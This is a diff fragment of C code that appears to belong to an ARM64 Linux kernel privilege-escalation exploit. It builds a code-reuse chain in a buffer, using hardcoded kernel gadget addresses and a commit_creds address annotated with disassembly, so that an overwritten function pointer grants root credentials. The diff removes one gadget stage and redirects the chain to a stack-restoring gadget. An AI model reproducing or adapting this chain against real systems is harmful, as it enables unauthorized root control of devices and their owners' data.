@@ -359,25 +359,7 @@ int trigger_overwritten_function_pointer() {
     //   ffffffc00097a9a0 e1 03 15 aa     mov        x1,x21
     //   ffffffc00097a9a4 40 00 3f d6     blr        x2
     buffer[(0x2b0 + 0x20) / 8] = COMMIT_CREDS_ADDR;
-    buffer[(0x2b0 + 0x18) / 8] = 0xffffffc0000c9ce8;
-
-    // fixup x0 for rest!
-    //   ffffffc0000c9ce8 82 26 40 f9     ldr        x2,[x20, #0x48]
-    //   ffffffc0000c9cec 80 2a 40 f9     ldr        x0,[x20, #0x50]
-    //   ffffffc0000c9cf0 40 00 3f d6     blr        x2
-    buffer[(0x2b0 + 0x48) / 8] = 0xffffffc0005c20c0;
-    buffer[(0x2b0 + 0x50) / 8] = (uint64_t) buffer;
-
-
-
-
-    // ###### now we should have 'fixed' the freelist, lets set x0 to 0 to avoid nasty logic                  **REMOVE?**
-    //   ffffffc0005c20c0 04 2c 40 f9     ldr        x4,[x0, #0x58]
-    //   ffffffc0005c20c4 c4 01 00 b4     cbz        x4,LAB_ffffffc0005c20fc
-    //   ffffffc0005c20c8 00 00 80 d2     mov        x0,#0x0
-    //   ffffffc0005c20cc e3 03 00 2a     mov        w3,w0
-    //   ffffffc0005c20d0 80 00 3f d6     blr        x4
-    buffer[0x58 / 8] = 0xffffffc00031d2bc;
+    buffer[(0x2b0 + 0x18) / 8] = 0xffffffc00031d2bc;
 
     // reload all the stuff we broke to keep system happy :)
     //   ffffffc00031d2bc f3 53 41 a9     ldp        x19,x20,[sp, #local_20]
